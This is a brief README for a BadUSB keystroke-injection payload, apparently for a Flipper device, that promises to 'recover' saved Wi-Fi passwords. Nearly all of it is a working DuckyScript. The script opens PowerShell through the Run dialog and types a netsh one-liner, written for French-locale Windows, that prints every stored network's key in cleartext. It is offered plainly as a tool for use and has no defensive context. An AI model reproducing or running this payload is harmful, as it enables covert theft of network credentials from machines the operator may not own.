# Badkb-USB-Flip-WIFI-grab




Allows you to recover the backup wifi passwords (already connected) for a machine.



# Script : 

    DELAY 1000
    GUI r
    DELAY 1000
    STRING powershell
    ENTER
    DELAY 2000
    STRING netsh wlan show profiles | Select-String "Profil Tous les utilisateurs" | ForEach-Object { $n = ($_ -split ":")[1].Trim(); $p = netsh wlan show profile name="$n" key=clear; $key = ($p | Select-String         "Contenu de la clé"); if ($key) { $key = $key.ToString().Split(":")[1].Trim(); Write-Output "nSSID: $nnMot de passe: $key" } else { Write-Output "nSSID: $nnPortail Captif" } }
    ENTER
